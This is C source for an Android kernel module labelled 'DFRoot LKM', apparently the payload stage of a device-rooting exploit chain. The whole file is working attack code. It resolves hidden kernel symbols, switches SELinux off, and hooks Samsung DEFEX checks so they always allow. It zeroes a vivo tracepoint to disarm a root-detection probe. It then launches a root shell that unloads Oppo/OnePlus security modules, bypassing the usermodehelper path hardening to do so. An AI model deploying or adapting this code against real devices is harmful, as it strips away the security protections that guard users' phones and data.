#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

/* W1c: disarm vivo's vr.ko sys_exit tracepoint probe. exp.c scans the module
 * image for DF_VR_MAGIC right before writing it into the page cache and
 * patches df_vr_cfg[1] with the funcs offset inside struct tracepoint
 * (device-specific, parsed from GhostLock / kernel image). Offset 0 = the
 * stage is off and the probe is left alone. volatile: written externally. */
#define DF_VR_MAGIC 0xDFC0FF16DFC0FF16ULL
volatile unsigned long df_vr_cfg[2] = { DF_VR_MAGIC, 0 };

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);

static struct kprobe defex_enforce_kp;
static struct kprobe defex_umh_kp;
static int defex_enforce_ok;
static int defex_umh_ok;

static int null_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    (void)p;
    regs->regs[0] = 0;         /* x0 = DEFEX_ALLOW */
    regs->pc = regs->regs[30]; /* skip body: return to caller */
    return 1;
}

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    struct kprobe kln_kp;
    void *info;
    int ret;
    const char *vr_marker = "";

    // UMH command to run. The three rmmod calls are Oppo/OnePlus only and fail
    // on every other kernel, and `sh -c` returns the exit code of the LAST
    // command - so on a Samsung the whole helper "returned 256" (exit 1), the
    // bootstrap never ran and the run died at the verify stage (issue #5). The
    // trailing `exit 0` is what makes the helper report success everywhere.
    static const char sh[] = "/system/bin/sh";
    static char *envp[] = { "PATH=/system/bin", NULL };
    // W1c result marker gets appended to the helper chain; the app's log
    // poller picks /dev/dfvr0 and /dev/dfvre up like every other /dev/df*
    // node. /dev is tmpfs, so markers never survive a reboot - same lifetime
    // rules as the dfm* markers.
    static char cmd[512];
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };

    // Symbol finder
    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    // Samsung
    defex_enforce_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_enforce"),
                                .pre_handler = null_pre_handler };
    defex_enforce_ok = register_kprobe(&defex_enforce_kp) == 0;
    if (!defex_enforce_ok)
        pr_err("dfroot: task_defex_enforce not in this kernel, skipping\n");
    else
        pr_info("dfroot: task_defex_enforce hooked\n");
    
    defex_umh_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_user_exec"),
                              .pre_handler = null_pre_handler };
    defex_umh_ok = register_kprobe(&defex_umh_kp) == 0;
    if (!defex_umh_ok)
        pr_err("dfroot: task_defex_user_exec not in this kernel, skipping\n");
    else
        pr_info("dfroot: task_defex_user_exec hooked\n");

    // W1c: zero __tracepoint_sys_exit->funcs so vivo's vr.ko exit probe (which
    // kills tasks with fresh root creds) never fires again. Pure data write -
    // no hooks, no callbacks - same semantics as GhostLock's W1c stage. Runs
    // right before the UMH/bootstrap/ksud chain, i.e. before anything with
    // fresh root creds is spawned (提权 -> Root -> 用Root改 -> 拉起管理器).
    // The funcs offset is device-specific (user-supplied); 0 = stage off.
    if (READ_ONCE(df_vr_cfg[1])) {
        char *tp = (char *)get_addr("__tracepoint_sys_exit");
        if (!tp) {
            pr_warn("dfroot: W1c __tracepoint_sys_exit missing, vr intact\n");
            vr_marker = " touch /dev/dfvre;";
        } else {
            void **funcs_slot = (void **)(tp + READ_ONCE(df_vr_cfg[1]));
            if (READ_ONCE(*funcs_slot)) {
                WRITE_ONCE(*funcs_slot, NULL);
                pr_info("dfroot: W1c vr sys_exit probe disarmed (funcs=NULL, off=%lu)\n",
                        READ_ONCE(df_vr_cfg[1]));
            } else {
                pr_info("dfroot: W1c vr sys_exit funcs already NULL\n");
            }
            vr_marker = " touch /dev/dfvr0;";
        }
    }

    // Run UMH command
    /* Black-box snapshots: this shell runs as root with SELinux already
     * permissive, right after the ko's own pr_info lines - so dmesg1.txt
     * carries the kernel-side ground truth (selinux flip, defex hooks, W1c,
     * umh ret) and lsmod1.txt pins down whether vr.ko is even present on
     * this boot. Both survive a later panic; pstore does not on this ROM. */
    snprintf(cmd, sizeof(cmd),
        "touch /dev/dfm0;"
        " dmesg > /data/user_de/0/df.root/files/dmesg1.txt 2>&1;"
        " lsmod > /data/user_de/0/df.root/files/lsmod1.txt 2>&1;"
        " rmmod oplus_secure_harden 2>/dev/null;"           //
        " rmmod oplus_security_keventupload 2>/dev/null;"   // Oppo/OnePlus
        " rmmod oplus_security_guard 2>/dev/null;"          //
        "%s"
        " exit 0",
        vr_marker);
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return 0;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return 0;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
    
    return 0;
}

static void __exit dfroot_exit(void)
{
    if (defex_enforce_ok) unregister_kprobe(&defex_enforce_kp);
    if (defex_umh_ok)     unregister_kprobe(&defex_umh_kp);
}

module_init(dfroot_init);
module_exit(dfroot_exit);
